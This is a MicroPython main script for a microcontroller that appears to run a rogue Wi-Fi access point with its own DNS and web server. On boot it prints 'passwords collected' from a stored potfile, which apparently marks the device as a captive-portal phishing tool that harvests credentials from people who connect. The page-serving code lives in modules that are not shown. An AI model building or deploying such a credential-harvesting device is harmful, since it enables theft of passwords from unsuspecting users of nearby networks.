# import gc
import sys
import dns
import server
import ap
import runner
import uasyncio as asyncio


def _handle_exception(loop, context):
    sys.print_exception(context["exception"])
    sys.exit()


@runner.main
def entrypoint():
    print("Board restarted, passwords collected:")
    try:
        with open('potfile') as f:
            print(f.read())
    except OSError:
        pass
    loop = asyncio.get_event_loop()
    loop.set_exception_handler(_handle_exception)
    ap.run()
    loop.create_task(asyncio.start_server(
        server.run, "0.0.0.0", 80))
    loop.create_task(dns.run())

    loop.run_forever()
